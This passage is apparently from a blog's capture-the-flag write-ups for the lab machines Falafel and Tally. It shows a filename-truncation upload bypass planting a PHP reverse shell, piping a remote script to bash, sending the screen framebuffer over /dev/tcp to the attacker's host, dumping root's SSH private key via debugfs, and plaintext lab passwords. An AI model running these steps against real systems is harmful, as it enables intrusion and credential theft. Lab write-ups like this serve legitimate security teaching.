the following response: Upload Succsesful! Output: CMD: cd /var/www/html/uploads/0529-0825_d97a30e4fc1bfb9d; wget 'http://10.10.14.15/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai.png' The name is too long, 255 chars total. Trying to shorten... New name is Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah. --2020-05-29 08:25:43-- http://10.10.14.15/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai.png Connecting to 10.10.14.15:80... connected. HTTP request sent, awaiting response... 200 OK Length: 0 [image/png] Saving to: 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah' 0K 0.00 =0s 2020-05-29 08:25:43 (0.00 B/s) - 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah' saved [0/0] We can see that the webserver complains that the file is too long and trunctates it to this: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah if we couont the characters we see this: m4rc0ff@SittingDucks:~/Documents/htbBoxes/falafel$ echo -n \"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah\" | wc -c 236 So we have 236 chars. I will now create a 240 characters file as follow: m4rc0ff@SittingDucks:~/Documents/htbBoxes/falafel$ touch Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php.png From the previous file I have basically removed the last 4 characters and added .php and .png . We know we need a .png (or any image) extension for the file to pass the upload filter. Once the file is uploaded the last 4 characters will be cut off hence remaining with the 236 characters file with .php extension. Of course we have to include our PHP shell inside the file before to do this operation: m4rc0ff@SittingDucks:~/Documents/htbBoxes/falafel$ cp /usr/share/webshells/php/php-reverse-shell.php Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php.png I changed the following parameters in the shell and added my box IP and 443 as a port: $VERSION = \"1.0\"; $ip = '10.10.14.15'; // CHANGE THIS $port = 443; // CHANGE THIS Now I set a netact listenr on port 443 on my kali machine and then I upload the file: Upload via url: Upload Succsesful! Output: CMD: cd /var/www/html/uploads/0529-0853_c2b0d421d9175469; wget 'http://10.10.14.15/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php.png' The name is too long, 240 chars total. Trying to shorten... New name is Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php. --2020-05-29 08:53:40-- http://10.10.14.15/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php.png Connecting to 10.10.14.15:80... connected. HTTP request sent, awaiting response... 200 OK Length: 5492 (5.4K) [image/png] Saving to: 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php' 0K ..... 100% 7.83M=0.001s 2020-05-29 08:53:40 (7.83 MB/s) - 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php' saved [5492/5492] Now as expected we see that the file is truncated again and the webserver saves the file with .php extension containing our shell. To trigger the shell we need to visit the location where the shell was saved which is /var/www/html/uploads/0529-0853_c2b0d421d9175469 as we see at the beginning of the output. So once I visit this address from my browser: http://10.10.10.73/uploads/0529-0853_c2b0d421d9175469/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php I get the shell back: m4rc0ff@SittingDucks:~$ sudo nc -lnvp 443 [sudo] password for m4rc0ff: listening on [any] 443 ... connect to [10.10.14.15] from (UNKNOWN) [10.10.10.73] 56932 Linux falafel 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux 08:58:41 up 23:03, 1 user, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT yossi tty1 Thu09 23:03m 0.04s 0.04s -bash uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can't access tty; job control turned off $ whoami www-data The can see that we are in as the www-data user. To upgrade to a full interactive shell I used a cheatsheet I created sometime ago available here with the only difference that I had to use python3 instead of python in the initial command because python was not installed. Having a look at the home directory: www-data@falafel:/home$ ls moshe yossi www-data@falafel:/home$ cd moshe bash: cd: moshe: Permission denied www-data@falafel:/home$ cd yossi/ bash: cd: yossi/: Permission denied we can see there are two users but both locations are not accessible. Since we got the shell as the www-data user, that is the default apache user, we surely have permission to access the webserver direrctories so let's have a look: www-data@falafel:/var/www/html$ ls -l total 80 drwxr-xr-- 2 root www-data 4096 Oct 29 2017 assets -rwxr-xr-- 1 root www-data 423 Oct 29 2017 authorized.php -rwxr-xr-- 1 root www-data 377 Nov 28 2017 connection.php drwxr-xr-- 2 root www-data 4096 Nov 28 2017 css -rwxr-xr-- 1 root www-data 804 Nov 27 2017 cyberlaw.txt -rwxr-xr-- 1 root www-data 0 Nov 27 2017 footer.php -rwxr-xr-- 1 root www-data 1140 Nov 27 2017 header.php -rwxr-xr-- 1 root www-data 7335 Aug 13 2015 icon.png drwxr-xr-- 2 root www-data 4096 Nov 27 2017 images -rwxr-xr-- 1 root www-data 818 Nov 28 2017 index.php drwxr-xr-- 2 root www-data 4096 Nov 28 2017 js -rwxr-xr-- 1 root www-data 752 Oct 29 2017 login.php -rwxr-xr-- 1 root www-data 1800 Nov 28 2017 login_logic.php -rwxr-xr-- 1 root www-data 107 Oct 29 2017 logout.php -rwxr-xr-- 1 root www-data 1913 Nov 28 2017 profile.php -rwxr-xr-- 1 root www-data 30 Nov 28 2017 robots.txt -rwxr-xr-- 1 root www-data 6174 Nov 28 2017 style.php -rwxr-xr-- 1 root www-data 3647 Nov 28 2017 upload.php drwxrwxr-- 14 root www-data 4096 May 29 08:54 uploads Browsing amongst the files I spotted this: www-data@falafel:/var/www/html$ cat connection.php <?php define ( 'DB_SERVER' , 'localhost:3306' ); define ( 'DB_USERNAME' , 'moshe' ); define ( 'DB_PASSWORD' , 'falafelIsReallyTasty' ); define ( 'DB_DATABASE' , 'falafel' ); $db = mysqli_connect ( DB_SERVER , DB_USERNAME , DB_PASSWORD , DB_DATABASE ); // Check connection if ( mysqli_connect_errno ()) { echo \"Failed to connect to MySQL: \" . mysqli_connect_error (); } ?> We can see the credentials to access the MySQL db in clear. So since the SSH port is open I try an SSH login with the same credentials: www-data@falafel:/var/www/html$ ssh moshe@localhost Could not create directory '/var/www/.ssh'. The authenticity of host 'localhost (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:XPYifpo9zwt53hU1RwUWqFvOB3TlCtyA1PfM9frNWSw. Are you sure you want to continue connecting (yes/no)? yes Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts). moshe@localhost's password: Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-112-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 0 packages can be updated. 0 updates are security updates. Last login: Mon Feb 5 23:35:10 2018 from 10.10.14.2 $ pwd /home/moshe $ cat user.txt c8****************************d3 and we are in as moshe and able to get the user.txt flag. At this stage, after having a look around I decided to run LinEnum to gather more information, so I started a python SimpleHttp server in my box to host LinEnum.sh and then I ran the below command from the victim box: moshe@falafel:~$ curl http://10.10.14.15/LinEnum.sh | bash The output is quite extensive so I will report only snippets of the interesting bits. This bit is interesting because tells us there is a user called yossi who is phisically ( tty ) logged in to the box console [-] Who else is logged on: 12:07:25 up 2:03, 2 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT yossi tty1 10:03 2:03m 0.05s 0.04s -bash moshe pts/0 10.10.14.15 11:16 5.00s 0.06s 0.06s python3 -c import pty;pty.spawn(\"/bin/bash\") This other bit is also interesting becaut it tells us the users group membership: console uid=1000(yossi) gid=1000(yossi) groups=1000(yossi),4(adm),6(disk),24(cdrom),30(dip),46(plugdev),117(lpadmin),118(sambashare) uid=1001(moshe) gid=1001(moshe) groups=1001(moshe),4(adm),8(mail),9(news),22(voice),25(floppy),29(audio),44(video),60(games) Let's focus to moshe for now. We see that moshe belogs to the video group. This is unusual and it may be useful, but why? From the Ubuntu wiki , we can see this about the video group: Use video devices This right is gained by adding the user to the \"video\" group. The \"video\" group can access /dev/fb0. By belonging to that group the user moshe has permissions to \"dump\" the phisycal monitor, and because youssi is currently logged in to the box through a tty (direct connection, not an SSH session), we may be able to steal some potentially useful information from his screen. As per the Ubuntu wiki, the frame buffer is stored in /dev/fb0 , so let's grab that frame and copy it over my linux box. Since python SimpleHTTPServer module is not aavailable on Falafel, I found another way to copy the file over (thanks to Ippsec video I mentioned earlier): First I setup a netat listener on port 4444 which redirects anything that comes to a file called fb0 m4rc0ff@SittingDucks:~/Documents/htbBoxes/falafel$ sudo nc -lnvp 4444 > fb0.raw [sudo] password for m4rc0ff: listening on [any] 4444 ... then from the victim box, I direct the content of the fb0 file to the port 4444 listener: moshe@falafel:~$ cat /dev/fb0 > /dev/tcp/10.10.14.15/4444 Once I do this I get something back and I can see the file is in my box: m4rc0ff@SittingDucks:~/Documents/htbBoxes/falafel$ sudo nc -lnvp 4444 > screenshot.raw [sudo] password for m4rc0ff: listening on [any] 4444 ... connect to [10.10.14.15] from (UNKNOWN) [10.10.10.73] 36364 &#94;C m4rc0ff@SittingDucks:~/Documents/htbBoxes/falafel$ ll | grep screen -rw-r--r-- 1 m4rc0ff m4rc0ff 1526575 May 29 11:57 screenshot.raw Looking at what kind of file we are dealing with, we see this: m4rc0ff@SittingDucks:~/Documents/htbBoxes/falafel$ file screenshot.raw screenshot.raw: Targa image data - Map (256-257) 257 x 1 x 1 +257 +1 - 1-bit alpha \"\\001\" A Targa image data (TGA) file is a kind of raw file. To be able to view the file we need to set the correct resolution. This can be fetched from: moshe@falafel:~$ cat /sys/class/graphics/fb0/virtual_size 1176,885 Then we can use gimp to open the file. It need so be opened as a \"RAW image data\" file type and also the resolution details found earlier should be inserted for the file to be readable. As you can see from below I also used \"RGB565 Big Endian\" so make the file readable: m4rc0ff@SittingDucks:~$ ssh yossi@10.10.10.73 yossi@10.10.10.73's password: Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-112-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 0 packages can be updated. 0 updates are security updates. Last login: Fri May 29 10:03:49 2020 yossi@falafel:~$ id uid=1000(yossi) gid=1000(yossi) groups=1000(yossi),4(adm),6(disk),24(cdrom),30(dip),46(plugdev),117(lpadmin),118(sambashare) As shown above I was able to login with the password found! The id command shows that the user yossi belongs to the group disk . We knew this already from the LinEnum.sh script I ran earlier. This means that yossi can read directly off the raw disks. To do that we can use debugfs utility. We can read directly the root flag but I always prefer to get a shell. Since we have access to the raw disks and therefore to the /root directory, and also knowing from LinEnum.sh output that the toot user is allowed to login through SSH, we can grab the SSH key and use it to login: yossi@falafel:~$ debugfs -R \"cat /root/.ssh/id_ssh/id_rsa\" /dev/sda1 debugfs 1.42.13 (17-May-2015) /root/.ssh/id_ssh/id_rsa: File not found by ext2_lookup yossi@falafel:~$ debugfs debugfs 1.42.13 (17-May-2015) debugfs: quit yossi@falafel:~$ debugfs /dev/sda1 debugfs 1.42.13 (17-May-2015) debugfs: ls debugfs: cd root debugfs: cd .ssh debugfs: cat id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEAyPdlQuyVr/L4xXiDVK8lTn88k4zVEEfiRVQ1AWxQPOHY7q0h b+Zd6WPVczObUnC+TaElpDXhf3gjLvjXvn7qGuZekNdB1aoWt5IKT90yz9vUx/gf v22+b8XdCdzyXpJW0fAmEN+m5DAETxHDzPdNfpswwYpDX0gqLCZIuMC7Z8D8Wpkg BWQ5RfpdFDWvIexRDfwj/Dx+tiIPGcYtkpQ/UihaDgF0gwj912Zc1N5+0sILX/Qd UQ+ZywP/qj1FI+ki/kJcYsW/5JZcG20xS0QgNvUBGpr+MGh2urh4angLcqu5b/ZV dmoHaOx/UOrNywkp486/SQtn30Er7SlM29/8PQIDAQABAoIBAQCGd5qmw/yIZU/1 eWSOpj6VHmee5q2tnhuVffmVgS7S/d8UHH3yDLcrseQhmBdGey+qa7fu/ypqCy2n gVOCIBNuelQuIAnp+EwI+kuyEnSsRhBC2RANG1ZAHal/rvnxM4OqJ0ChK7TUnBhV +7IClDqjCx39chEQUQ3+yoMAM91xVqztgWvl85Hh22IQgFnIu/ghav8Iqps/tuZ0 /YE1+vOouJPD894UEUH5+Bj+EvBJ8+pyXUCt7FQiidWQbSlfNLUWNdlBpwabk6Td OnO+rf/vtYg+RQC+Y7zUpyLONYP+9S6WvJ/lqszXrYKRtlQg+8Pf7yhcOz/n7G08 kta/3DH1AoGBAO0itIeAiaeXTw5dmdza5xIDsx/c3DU+yi+6hDnV1KMTe3zK/yjG UBLnBo6FpAJr0w0XNALbnm2RToX7OfqpVeQsAsHZTSfmo4fbQMY7nWMvSuXZV3lG ahkTSKUnpk2/EVRQriFjlXuvBoBh0qLVhZIKqZBaavU6iaplPVz72VvLAoGBANj0 GcJ34ozu/XuhlXNVlm5ZQqHxHkiZrOU9aM7umQkGeM9vNFOwWYl6l9g4qMq7ArMr 5SmT+XoWQtK9dSHVNXr4XWRaH6aow/oazY05W/BgXRMxolVSHdNE23xuX9dlwMPB f/y3ZeVpbREroPOx9rZpYiE76W1gZ67H6TV0HJcXAoGBAOdgCnd/8lAkcY2ZxIva xsUr+PWo4O/O8SY6vdNUkWIAm2e7BdX6EZ0v75TWTp3SKR5HuobjVKSht9VAuGSc HuNAEfykkwTQpFTlmEETX9CsD09PjmsVSmZnC2Wh10FaoYT8J7sKWItSzmwrhoM9 BVPmtWXU4zGdST+KAqKcVYubAoGAHR5GBs/IXFoHM3ywblZiZlUcmFegVOYrSmk/ k+Z6K7fupwip4UGeAtGtZ5vTK8KFzj5p93ag2T37ogVDn1LaZrLG9h0Sem/UPdEz HW1BZbXJSDY1L3ZiAmUPgFfgDSze/mcOIoEK8AuCU/ejFpIgJsNmJEfCQKfbwp2a M05uN+kCgYBq8iNfzNHK3qY+iaQNISQ657Qz0sPoMrzQ6gAmTNjNfWpU8tEHqrCP NZTQDYCA31J/gKIl2BT8+ywQL50avvbxcXZEsy14ExVnaTpPQ9m2INlxz97YLxjZ FEUbkAlzcvN/S3LJiFbnkQ7uJ0nPj4oPw1XBcmsQoBwPFOcCEvHSrg== -----END RSA PRIVATE KEY----- So now we can put copy this on a file and use it to login: m4rc0ff@SittingDucks:~/Documents/htbBoxes/falafel$ ssh -i ssh.key root@10.10.10.73 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @ WARNING: UNPROTECTED PRIVATE KEY FILE! @ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ Permissions 0644 for 'ssh.key' are too open. It is required that your private key files are NOT accessible by others. This private key will be ignored. Load key \"ssh.key\": bad permissions root@10.10.10.73's password: m4rc0ff@SittingDucks:~/Documents/htbBoxes/falafel$ chmod 600 ssh.key m4rc0ff@SittingDucks:~/Documents/htbBoxes/falafel$ ssh -i ssh.key root@10.10.10.73 Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-112-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 0 packages can be updated. 0 updates are security updates. Last login: Tue May 1 20:14:09 2018 from 10.10.14.4 root@falafel:~# ls -l total 4 -r-------- 1 root root 33 Nov 27 2017 root.txt root@falafel:~# cat root.txt 23****************************a1","tags":"blogging","loc":"https://sittingducks.io/Falafel.html","title":"Falafel"},{"url":"https://sittingducks.io/Tally.html","text":"First thing first, this box is slow! Everything takes ages to load, especially sharepoint. Putting this little frustration aside, Tally taught me quite few things. One thing I learnt, for instance, is that viewlsts.aspx is a default page you should always check in sharepoint even before scanning for directories, I wasted quite some time in there. Thanks to some credentials found on sharepoint you can get into the box through FTP. Then you will find a KeePass file to crack and SQL credentials found on an exe file, not an easy one to spot to be honest. Then you can get a reverse shell through the xp_cmdshell in MSSQL. There are also few ways to privesc but I used Juicy Potato exploit to impersonate the \"NT AUTHORITY\\SYSTEM\" account. Overall lot of fun! Recon m4rc0ff@SittingDucks:~$ nmap -sC -sV 10 .10.10.59 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-18 22:26 BST Nmap scan report for 10.10.10.59 Host is up (0.62s latency). Not shown: 992 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft IIS httpd 10.0 |_http-generator: Microsoft SharePoint |_http-server-header: Microsoft-IIS/10.0 | http-title: Home |_Requested resource was http://10.10.10.59/_layouts/15/start.aspx#/default.aspx 81/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Bad Request 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 808/tcp open ccproxy-http? 1433/tcp open ms-sql-s Microsoft SQL Server 2016 13.00.1601.00; RTM | ms-sql-ntlm-info: | Target_Name: TALLY | NetBIOS_Domain_Name: TALLY | NetBIOS_Computer_Name: TALLY | DNS_Domain_Name: TALLY | DNS_Computer_Name: TALLY |_ Product_Version: 10.0.14393 | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2020-05-18T20:37:53 |_Not valid after: 2050-05-18T20:37:53 |_ssl-date: 2020-05-18T21:26:32+00:00; -1m47s from scanner time. Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -1m47s, deviation: 0s, median: -1m47s | ms-sql-info: | 10.10.10.59:1433: | Version: | name: Microsoft SQL Server 2016 RTM | number: 13.00.1601.00 | Product: Microsoft SQL Server 2016 | Service pack level: RTM | Post-SP patches applied: false |_ TCP port: 1433 |_smb-os-discovery: ERROR: Script execution failed (use -d to debug) | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-05-18T21:26:20 |_ start_date: 2020-05-18T20:37:27 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 111.77 seconds nmap gave few results. As a start we will have a look at the default http page: As pointed by the nmap output, we are dealing with a sharepoint web application. I inspected the heml source code and did not find anything suspicious. I started scanning for directories with gobuster using the dirbuster medium directory list file but it was extremely slows. At that point I found out there are other directory listing files tailored for sharepoint, such as SecLists one. So I give it a try: m4rc0ff@SittingDucks:~$ gobuster dir -u 10 .10.10.59 -w /usr/share/wordlist/SecLists/Discovery/Web-Content/CMS/sharepoint.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.59 [+] Threads: 10 [+] Wordlist: /usr/share/SecLists/Discovery/Web-Content/CMS/sharepoint.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/05/19 06:58:49 Starting gobuster =============================================================== /_app_bin (Status: 301) /_controltemplates (Status: 301) /_layouts (Status: 301) /_layouts/1033 (Status: 301) /_layouts/1033/avreport.htm (Status: 200) <SNIP> /_layouts/viewedit.aspx (Status: 302) /_layouts/viewlsts.aspx (Status: 302) /_layouts/versions.aspx (Status: 302) /_layouts/versiondiff.aspx (Status: 302) /_layouts/viewgrouppermissions.aspx (Status: 302) /_layouts/viewscopes.aspx (Status: 302) /_layouts/viewnew.aspx (Status: 302) /_layouts/viewscopesettings.aspx (Status: 302) /_layouts/viewtype.aspx (Status: 302) <SNIP> I got too many results and I started checking some of the more meaningful names but was getting nowhere, mostly because of my unfamiliarity with Sharepoint. Then I learnt that viewlsts.aspx is a default page that should be checked: Here we can see 2 available items. Navigating to the documents page shows a word file: Once I downloaded the word doc I can see these details inside: FTP details hostname: tally workgroup: htb.local password: UTDRSCH53c\"$6hys Please create your own user folder upon logging in Seems like we have a password but we are missing the user name. Navigating to the SitePages I can see this: Apparently ftp_user is a valid user. Let's try if the password we found matches this account: m4rc0ff@SittingDucks:~$ ftp 10 .10.10.59 Connected to 10.10.10.59. 220 Microsoft FTP Service Name (10.10.10.59:m4rc0ff): ftp_user 331 Password required Password: 230 User logged in. Remote system type is Windows_NT. ftp> We are in! I noticed there are few directories with with many files. So I looked up for a way to donwload all files from an FTP and found out we can use wget to do that: wget -m --user=username --password=password ftp://FTPSERVER Having the files locally would allow me to explore them easily and do stuff like grep and so on. so I added tally.htb.local to my /etc/hosts file and then I ran this command: m4rc0ff@SittingDucks:~/Documents/htbBoxes/tally$ wget -m --user = ftp_user --password = 'UTDRSCH53c\"$6hys' ftp://tally.htb.local --2020-05-19 08:48:39-- ftp://tally.htb.local/ => ‘tally.htb.local/.listing' Resolving tally.htb.local (tally.htb.local)... 10.10.10.59 Connecting to tally.htb.local (tally.htb.local)|10.10.10.59|:21... connected. Logging in as ftp_user ... Logged in! ==> SYST ... done. ==> PWD ... done. ==> TYPE I ... done. ==> CWD not needed. ==> PASV ... done. ==> LIST ... done. tally.htb.local/.listing [ <=> ] 244 --.-KB/s in 0s ==> PASV ... done. ==> LIST ... done. tally.htb.local/.listing [ <=> ] 244 --.-KB/s in 0s 2020-05-19 08:48:41 (70.3 MB/s) - ‘tally.htb.local/.listing' saved [488] <SNIP> Once the files are downloaded I launch an ll -R|less so I can see the content of all the directories recursively. One thing got immediately my attention: ./Tim/Files: total 12 -rw-r--r-- 1 m4rc0ff m4rc0ff 17 Sep 15 2017 bonus.txt drwxr-xr-x 